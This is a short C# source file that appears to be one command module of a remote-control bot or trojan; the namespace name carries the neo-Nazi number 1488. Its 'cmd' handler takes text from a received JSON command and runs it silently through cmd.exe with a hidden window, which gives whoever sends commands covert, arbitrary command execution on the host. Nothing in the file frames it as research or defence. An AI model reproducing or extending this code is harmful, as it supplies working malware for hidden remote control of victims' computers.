using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using HornetInc.JsonAPI.Json;

namespace Project1488Reborn.Commands
{
    class CCmd : Command
    {
        public override string Name => "cmd";

        public override void Execute(HornetInc.JsonAPI.Json.Command com)
        {

            Process proc = new Process();
            proc.StartInfo.FileName = $"{Environment.GetEnvironmentVariable("WINDIR")}\\System32\\cmd.exe";
            proc.StartInfo.Arguments = "/C " + com.Value;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
        }
    }
}
